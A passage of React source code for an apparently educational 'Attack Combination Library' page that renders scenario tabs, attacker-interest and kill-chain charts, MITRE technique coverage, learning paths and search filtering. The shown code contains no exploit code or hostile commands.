                            <span style={{ fontFamily:T.mono, fontSize:'0.65rem', color:T.white, border:`1px solid ${T.b2}`, background:T.s1, padding:'6px 14px' }}>{combo.service}</span>
                            <span style={{ color:T.muted }}>+</span>
                            <span style={{ fontFamily:T.mono, fontSize:'0.65rem', color:T.red, border:`1px solid ${T.red}44`, background:`${T.red}0d`, padding:'6px 14px' }}>{combo.misconfig}</span>
                        </div>

                        {/* Quote */}
                        <div style={{ borderLeft:`2px solid ${T.amber}`, padding:'10px 16px', background:`${T.amber}08` }}>
                            <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.amber, margin:0, fontStyle:'italic' }}>
                                {"// "}{combo.tagline}
                            </p>
                        </div>

                        <div>
                            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'8px' }}>WHAT IS THIS COMBINATION?</p>
                            <p style={{ fontFamily:T.sans, fontSize:'0.88rem', color:'#bbb', lineHeight:1.7 }}>{combo.overview}</p>
                        </div>
                        <div>
                            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'8px' }}>WHY ATTACKERS CARE</p>
                            <p style={{ fontFamily:T.sans, fontSize:'0.88rem', color:'#bbb', lineHeight:1.7 }}>{combo.whyAttackersCare}</p>
                        </div>
                        <div>
                            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'8px' }}>ATTACKER OBJECTIVES</p>
                            <div style={{ display:'flex', flexWrap:'wrap', gap:'6px' }}>
                                {combo.objectives.map(o => <ObjectivePill key={o} label={o} />)}
                            </div>
                        </div>
                        <div>
                            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'8px' }}>ATTACKER INTEREST</p>
                            <InterestBar score={combo.interestScore} />
                        </div>
                    </div>
                )}
                {tab === 1 && <TerminalSession steps={combo.terminal} />}
                {tab === 2 && <KillChainVisual combo={combo} />}
                {tab === 3 && <MitreTab combo={combo} />}
                {tab === 4 && (
                    <div>
                        <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'12px' }}>REAL-WORLD USAGE</p>
                        <p style={{ fontFamily:T.sans, fontSize:'0.88rem', color:'#bbb', lineHeight:1.75 }}>{combo.realWorld}</p>
                    </div>
                )}
                {tab === 5 && <DefenderTab combo={combo} />}
            </div>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// RECHARTS VISUALIZATIONS
// ═══════════════════════════════════════════════════════════════
const CustomTooltip = ({ active, payload, label }) => {
    if (!active || !payload?.length) return null;
    return (
        <div style={{ background:'#111', border:`1px solid ${T.b2}`, padding:'10px 14px' }}>
            <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.white, marginBottom:'4px' }}>{label || payload[0]?.payload?.name}</p>
            <p style={{ fontFamily:T.mono, fontSize:'0.65rem', color:INTEREST_COLOR(payload[0]?.value) }}>{payload[0]?.value}</p>
        </div>
    );
};

function VisualizationsSection() {
    const top12 = [...COMBOS].sort((a,b) => b.interestScore - a.interestScore).slice(0, 12);

    // Kill chain coverage data
    const kcCoverage = KC_PHASES.map(phase => {
        const count = COMBOS.filter(c => c.killChainStage === phase || c.objectives.some(o => {
            const m = { 'Initial Access':'Initial Access', 'Lateral Movement':'Lateral Movement', 'Collection':'Collection', 'Exfiltration':'Exfiltration', 'Impact':'Impact', 'Persistence':'Persistence', 'Privilege Escalation':'Privilege Escalation', 'C2':'C2' };
            return m[o] === phase;
        })).length;
        return { phase: phase.replace(' ', '\n'), fullPhase: phase, count, maxCount: COMBOS.length };
    });

    return (
        <section style={{ borderBottom:`1px solid ${T.border}`, background:T.s1, padding:'60px 0' }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px' }}>
                <div style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.2em', marginBottom:'8px' }}>DATA INTELLIGENCE</div>
                <h2 style={{ fontFamily:T.disp, fontSize:'2.4rem', textTransform:'uppercase', marginBottom:'40px' }}>
                    LIBRARY ANALYTICS
                </h2>

                <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(500px, 1fr))', gap:'24px' }}>
                    {/* Bar Chart — Most Abused */}
                    <div style={{ background:T.bg, border:`1px solid ${T.border}`, padding:'24px' }}>
                        <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.15em', marginBottom:'20px' }}>ATTACKER INTEREST RANKING</p>
                        <ChartExplainer
                            title="Attacker Interest Ranking"
                            explanation="This chart displays the top misconfiguration combinations ranked by how attractive they are to attackers. High scores usually mean the misconfiguration is easy to exploit and provides a high payoff (e.g., direct remote code execution or admin access)."
                        >
                            <ResponsiveContainer width="100%" height={340}>
                                <BarChart data={top12.map(c => ({ name: c.name.length > 22 ? c.name.slice(0,22)+'…' : c.name, score: c.interestScore }))}
                                    layout="vertical" margin={{ left:10, right:20, top:0, bottom:0 }}>
                                    <CartesianGrid strokeDasharray="3 3" stroke={T.s3} horizontal={false} />
                                    <XAxis type="number" domain={[0,100]} tick={{ fontFamily:T.mono, fontSize:9, fill:T.muted }} axisLine={false} tickLine={false} />
                                    <YAxis type="category" dataKey="name" width={160} tick={{ fontFamily:T.mono, fontSize:8, fill:T.muted }} axisLine={false} tickLine={false} />
                                    <Tooltip content={<CustomTooltip />} cursor={{ fill:'rgba(255,255,255,0.03)' }} />
                                    <Bar dataKey="score" radius={[0,2,2,0]}>
                                        {top12.map((c, i) => (
                                            <Cell key={i} fill={INTEREST_COLOR(c.interestScore)} opacity={0.85} />
                                        ))}
                                    </Bar>
                                </BarChart>
                            </ResponsiveContainer>
                        </ChartExplainer>
                    </div>

                    {/* Radar Chart — Kill Chain Coverage */}
                    <div style={{ background:T.bg, border:`1px solid ${T.border}`, padding:'24px' }}>
                        <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.15em', marginBottom:'20px' }}>KILL CHAIN COVERAGE</p>
                        <ChartExplainer
                            title="Kill Chain Coverage"
                            explanation="This radar graph maps the entire attack library against the standard cyber kill chain. A large spike indicates that we have many documented combinations covering that specific phase (e.g., lots of Initial Access combinations)."
                        >
                            <ResponsiveContainer width="100%" height={340}>
                                <RadarChart data={kcCoverage}>
                                    <PolarGrid stroke={T.s3} />
                                    <PolarAngleAxis dataKey="phase" tick={{ fontFamily:T.mono, fontSize:8, fill:T.muted }} />
                                    <PolarRadiusAxis angle={90} domain={[0, Math.max(...kcCoverage.map(d=>d.count))]} tick={false} axisLine={false} />
                                    <Radar name="Coverage" dataKey="count" stroke={T.red} fill={T.red} fillOpacity={0.12} strokeWidth={1.5} />
                                    <Legend formatter={() => <span style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.muted }}>LIBRARY COVERAGE</span>} />
                                    <Tooltip content={({ active, payload }) => active && payload?.length ? (
                                        <div style={{ background:'#111', border:`1px solid ${T.b2}`, padding:'8px 12px' }}>
                                            <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.white }}>{payload[0]?.payload?.fullPhase}</p>
                                            <p style={{ fontFamily:T.mono, fontSize:'0.65rem', color:T.red }}>{payload[0]?.value} combinations</p>
                                        </div>
                                    ) : null} />
                                </RadarChart>
                            </ResponsiveContainer>
                        </ChartExplainer>
                    </div>

                    {/* Tier distribution */}
                    <div style={{ background:T.bg, border:`1px solid ${T.border}`, padding:'24px' }}>
                        <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.15em', marginBottom:'20px' }}>TIER DISTRIBUTION</p>
                        <ChartExplainer
                            title="Tier Distribution"
                            explanation="This simple chart shows the difficulty level of the attacks in the library. Beginner attacks are trivial to execute, whereas Advanced attacks require deep technical knowledge and multiple steps."
                        >
                            <ResponsiveContainer width="100%" height={200}>
                                <BarChart data={[
                                    { name:'BEGINNER', count:COMBOS.filter(c=>c.tier==='beginner').length, fill:T.green },
                                    { name:'INTERMEDIATE', count:COMBOS.filter(c=>c.tier==='intermediate').length, fill:T.amber },
                                    { name:'ADVANCED', count:COMBOS.filter(c=>c.tier==='advanced').length, fill:T.red },
                                ]}>
                                    <CartesianGrid strokeDasharray="3 3" stroke={T.s3} vertical={false} />
                                    <XAxis dataKey="name" tick={{ fontFamily:T.mono, fontSize:9, fill:T.muted }} axisLine={false} tickLine={false} />
                                    <YAxis tick={{ fontFamily:T.mono, fontSize:9, fill:T.muted }} axisLine={false} tickLine={false} />
                                    <Tooltip content={<CustomTooltip />} cursor={{ fill:'rgba(255,255,255,0.03)' }} />
                                    <Bar dataKey="count" radius={[2,2,0,0]}>
                                        {['beginner','intermediate','advanced'].map((t,i) => (
                                            <Cell key={i} fill={TIER_COLOR[t]} />
                                        ))}
                                    </Bar>
                                </BarChart>
                            </ResponsiveContainer>
                        </ChartExplainer>

                        {/* Objective heatmap-style breakdown */}
                        <div style={{ marginTop:'20px' }}>
                            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'10px' }}>TOP ATTACK OBJECTIVES</p>
                            {['Initial Access','Lateral Movement','Credential Access','Collection','Impact','Persistence'].map(obj => {
                                const count = COMBOS.filter(c => c.objectives.includes(obj)).length;
                                const pct = count / COMBOS.length;
                                return (
                                    <div key={obj} style={{ display:'flex', alignItems:'center', gap:'10px', marginBottom:'6px' }}>
                                        <span style={{ fontFamily:T.mono, fontSize:'0.55rem', color:T.muted, width:'110px', flexShrink:0 }}>{obj.toUpperCase()}</span>
                                        <div style={{ flex:1, height:'6px', background:T.s3, position:'relative' }}>
                                            <div style={{ position:'absolute', left:0, top:0, height:'100%', width:`${pct*100}%`, background:T.blue, transition:'width 1s ease' }}/>
                                        </div>
                                        <span style={{ fontFamily:T.mono, fontSize:'0.55rem', color:T.blue, width:'20px', textAlign:'right' }}>{count}</span>
                                    </div>
                                );
                            })}
                        </div>
                    </div>

                    {/* MITRE Coverage summary */}
                    <div style={{ background:T.bg, border:`1px solid ${T.border}`, padding:'24px' }}>
                        <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.15em', marginBottom:'20px' }}>MITRE TECHNIQUE COVERAGE</p>
                        <div style={{ display:'flex', flexWrap:'wrap', gap:'4px' }}>
                            {[...new Set(COMBOS.flatMap(c => c.mitreTechniques.map(t => t.id)))].sort().map(tid => {
                                const count = COMBOS.filter(c => c.mitreTechniques.some(t => t.id === tid)).length;
                                const color = count >= 3 ? T.red : count === 2 ? T.amber : T.blue;
                                return (
                                    <span key={tid} title={`${tid}: covered by ${count} combination(s)`} style={{
                                        fontFamily:T.mono, fontSize:'0.48rem', color, border:`1px solid ${color}44`,
                                        background:`${color}0d`, padding:'2px 5px', letterSpacing:'0.04em',
                                        cursor:'default',
                                    }}>
                                        {tid}
                                    </span>
                                );
                            })}
                        </div>
                        <div style={{ marginTop:'16px', display:'flex', gap:'16px' }}>
                            {[{ c:T.red, label:'3+ combinations'}, {c:T.amber, label:'2 combinations'}, {c:T.blue, label:'1 combination'}].map(({c,label}) => (
                                <div key={label} style={{ display:'flex', alignItems:'center', gap:'5px' }}>
                                    <div style={{ width:'8px', height:'8px', background:c }}/>
                                    <span style={{ fontFamily:T.mono, fontSize:'0.52rem', color:T.muted }}>{label}</span>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </section>
    );
}

// ═══════════════════════════════════════════════════════════════
// LEARNING PATH TRACKER
// ═══════════════════════════════════════════════════════════════
function LearningPathTracker({ onSelect }) {
    const paths = {
        beginner: ['COMBO-001','COMBO-002','COMBO-003','COMBO-004','COMBO-005','COMBO-012','COMBO-018'],
        intermediate: ['COMBO-019','COMBO-020','COMBO-025','COMBO-026','COMBO-032','COMBO-035','COMBO-036'],
        advanced: ['COMBO-039','COMBO-040','COMBO-041','COMBO-044','COMBO-048'],
    };

    return (
        <section style={{ borderBottom:`1px solid ${T.border}`, background:'#050505', padding:'60px 0' }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px' }}>
                <div style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.2em', marginBottom:'8px' }}>STRUCTURED LEARNING</div>
                <h2 style={{ fontFamily:T.disp, fontSize:'2.4rem', textTransform:'uppercase', marginBottom:'40px' }}>RECOMMENDED PATHS</h2>
                {(['beginner','intermediate','advanced']).map(tier => {
                    const tierCombos = paths[tier].map(id => COMBOS.find(c => c.id === id)).filter(Boolean);
                    const color = TIER_COLOR[tier];
                    return (
                        <div key={tier} style={{ marginBottom:'32px' }}>
                            <div style={{ display:'flex', alignItems:'center', gap:'12px', marginBottom:'14px' }}>
                                <span style={{ fontFamily:T.disp, fontSize:'1.2rem', color, textTransform:'uppercase' }}>{tier}</span>
                                <div style={{ flex:1, height:'1px', background:T.s3 }}/>
                            </div>
                            <div style={{ display:'flex', alignItems:'center', gap:'0', overflowX:'auto', paddingBottom:'8px' }}>
                                {tierCombos.map((c, i) => (
                                    <div key={c.id} style={{ display:'flex', alignItems:'center', flexShrink:0 }}>
                                        <button onClick={() => onSelect(c)} style={{
                                            background:T.s1, border:`1px solid ${T.border}`,
                                            borderTop:`2px solid ${color}`,
                                            padding:'10px 16px', cursor:'pointer', transition:'all 0.15s',
                                            display:'flex', flexDirection:'column', gap:'4px', minWidth:'140px',
                                        }}
                                            onMouseEnter={e => { e.currentTarget.style.borderColor=color; e.currentTarget.style.background=T.s2; }}
                                            onMouseLeave={e => { e.currentTarget.style.borderColor=T.border; e.currentTarget.style.background=T.s1; }}
                                        >
                                            <span style={{ fontFamily:T.mono, fontSize:'0.45rem', color:T.muted }}>STEP {i+1}</span>
                                            <span style={{ fontFamily:T.sans, fontSize:'0.72rem', color:T.white, lineHeight:1.3, textAlign:'left' }}>{c.name}</span>
                                        </button>
                                        {i < tierCombos.length - 1 && (
                                            <span style={{ color:color, fontSize:'1rem', padding:'0 4px', flexShrink:0 }}>→</span>
                                        )}
                                        {i === tierCombos.length - 1 && tier !== 'advanced' && (
                                            <span style={{ fontFamily:T.mono, fontSize:'0.5rem', color:T.muted, padding:'0 12px', flexShrink:0 }}>→ NEXT PATH</span>
                                        )}
                                    </div>
                                ))}
                            </div>
                        </div>
                    );
                })}
            </div>
        </section>
    );
}

// ═══════════════════════════════════════════════════════════════
// FOOTER CTA
// ═══════════════════════════════════════════════════════════════
function FooterCTA() {
    const navigate = useNavigate();
    return (
        <section style={{ padding:'72px 0', background:'radial-gradient(ellipse at 50% 100%, #1a0505 0%, #000 70%)' }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px', textAlign:'center' }}>
                <p style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.2em', marginBottom:'12px' }}>NEXT STEP</p>
                <h2 style={{ fontFamily:T.disp, fontSize:'clamp(2rem,5vw,4rem)', textTransform:'uppercase', marginBottom:'16px', lineHeight:1 }}>
                    READY TO SIMULATE AN ATTACK?
                </h2>
                <p style={{ fontFamily:T.sans, fontSize:'1rem', color:'#888', marginBottom:'32px', lineHeight:1.6 }}>
                    Take any combination from the library and analyze it in the ETH engine.<br/>
                    See the full kill chain, MITRE mapping, and defender recommendations — for your specific environment.
                </p>
                <button onClick={() => navigate('/lab')} style={{
                    fontFamily:T.mono, fontSize:'0.8rem', fontWeight:700, letterSpacing:'0.14em',
                    textTransform:'uppercase', background:T.red, color:T.white,
                    border:'none', cursor:'pointer', padding:'16px 40px', transition:'background 0.15s',
                }}
                    onMouseEnter={e => e.currentTarget.style.background='#cc0028'}
                    onMouseLeave={e => e.currentTarget.style.background=T.red}
                >
                    OPEN ETH LAB →
                </button>
            </div>
        </section>
    );
}

// ═══════════════════════════════════════════════════════════════
// ROOT PAGE COMPONENT
// ═══════════════════════════════════════════════════════════════
export default function AttackLibrary() {
    const gridRef    = useRef(null);
    const [search, setSearch]                   = useState('');
    const [activeTier, setActiveTier]           = useState('all');
    const [activeObjective, setActiveObjective] = useState('');
    const [selectedCombo, setSelectedCombo]     = useState(null);

    const filteredCombos = useMemo(() => {
        const q = search.toLowerCase();
        return COMBOS.filter(c => {
            if (activeTier !== 'all' && c.tier !== activeTier) return false;
            if (activeObjective && !c.objectives.includes(activeObjective)) return false;
            if (q && ![c.name, c.service, c.misconfig, ...(c.tags||[]), ...c.mitreTechniques.map(t=>t.id+' '+t.name)].join(' ').toLowerCase().includes(q)) return false;
            return true;
        });
    }, [search, activeTier, activeObjective]);

    const handleFilter = useCallback((tier) => {
        setActiveTier(tier);
        setSelectedCombo(null);
        setTimeout(() => gridRef.current?.scrollIntoView({ behavior:'smooth', block:'start' }), 100);
    }, []);

    const handleSelect = useCallback((combo) => {
        setSelectedCombo(prev => prev?.id === combo.id ? null : combo);
        setTimeout(() => gridRef.current?.scrollIntoView({ behavior:'smooth', block:'nearest' }), 50);
    }, []);

    const handleScrollToGrid = useCallback(() => {
        gridRef.current?.scrollIntoView({ behavior:'smooth', block:'start' });
    }, []);

    return (
        <div style={{ minHeight:'100vh', background:T.bg, color:T.white }}>
            {/* SEO */}
            <title>Attack Combination Library — Explain The Hacker</title>

            <LibraryHero onScrollToGrid={handleScrollToGrid} />
            <LearningPathNavigator onFilter={handleFilter} />

            <SearchFilterBar
                search={search} setSearch={setSearch}
                activeTier={activeTier} setActiveTier={setActiveTier}
                activeObjective={activeObjective} setActiveObjective={setActiveObjective}
                resultCount={filteredCombos.length}
            />

            {/* Main grid + simulator layout */}
            <section ref={gridRef} style={{ padding:'40px 0 60px' }}>
                <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px' }}>
                    <div style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.2em', marginBottom:'8px', textTransform:'uppercase' }}>COMBINATION EXPLORER</div>
                    <div style={{ display:'flex', justifyContent:'space-between', alignItems:'baseline', marginBottom:'24px' }}>
                        <h2 style={{ fontFamily:T.disp, fontSize:'2rem', textTransform:'uppercase', margin:0 }}>
                            {activeTier === 'all' ? 'ALL COMBINATIONS' : TIER_LABEL[activeTier] + ' COMBINATIONS'}
                        </h2>
                        {selectedCombo && (
                            <span style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.red, letterSpacing:'0.1em' }}>
                                VIEWING: {selectedCombo.name}
                            </span>
                        )}
                    </div>

                    {filteredCombos.length === 0 ? (
                        <div style={{ textAlign:'center', padding:'60px', color:T.muted, fontFamily:T.mono, fontSize:'0.8rem' }}>
                            No combinations match your filters.
                        </div>
                    ) : (
                        <div style={{ display:'grid', gap:'24px', gridTemplateColumns: selectedCombo ? '1fr 1fr' : 'repeat(auto-fill, minmax(320px, 1fr))', alignItems:'start' }}>
                            {/* Card grid */}
                            <div style={{ display:'grid', gap:'8px', gridTemplateColumns: selectedCombo ? '1fr' : 'repeat(auto-fill, minmax(300px, 1fr))', alignContent:'start' }}>
                                {filteredCombos.map(c => (
                                    <ComboCard key={c.id} combo={c} onSelect={handleSelect} isSelected={selectedCombo?.id === c.id} />
                                ))}
                            </div>

                            {/* Simulator panel */}
                            {selectedCombo && (
                                <ScenarioPanel combo={selectedCombo} onClose={() => setSelectedCombo(null)} />
                            )}
                        </div>
                    )}
                </div>
            </section>

            <VisualizationsSection />
            <LearningPathTracker onSelect={handleSelect} />
            <FooterCTA />
        </div>
    );
}
